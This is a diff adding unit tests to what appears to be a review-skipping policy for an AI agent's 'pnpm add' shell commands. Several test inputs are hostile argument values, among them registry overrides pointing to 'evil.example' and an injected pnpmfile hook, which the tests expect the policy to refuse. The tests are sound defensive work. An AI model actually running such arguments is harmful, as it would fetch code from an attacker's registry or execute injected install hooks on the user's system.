@@ -131,5 +131,16 @@ class ReviewRound2(unittest.TestCase):
             self.assertFalse(skip('fix it', 'run_shell: pnpm install --frozen-lockfile', policy='scoped+dev',
                                   ctx=dict(CTX, untrusted_files=[f])), f)
 
+class ReviewRound3(unittest.TestCase):
+    def test_pnpm_add_allow_lists_options(self):
+        for a in ['--config.registry=https://evil.example', '--@happy:registry=https://evil.example', '--pnpmfile=.tmp/h.cjs',
+                  '--allow-build=happy-dom', '-w']:
+            self.assertFalse(skip('install happy-dom', 'run_shell: pnpm add -D happy-dom ' + a), a)
+        self.assertTrue(skip('install happy-dom', 'run_shell: pnpm add -D -E happy-dom@21.0.4'))
+
+    def test_pnpm_add_refuses_changed_install_inputs(self):
+        for f in ['.pnpmfile.cjs', 'package.json', 'pnpm-workspace.yaml', '.npmrc']:
+            self.assertFalse(skip('install happy-dom', 'run_shell: pnpm add -D happy-dom', ctx=dict(CTX, untrusted_files=[f])), f)
+
 if __name__ == '__main__':
     unittest.main()
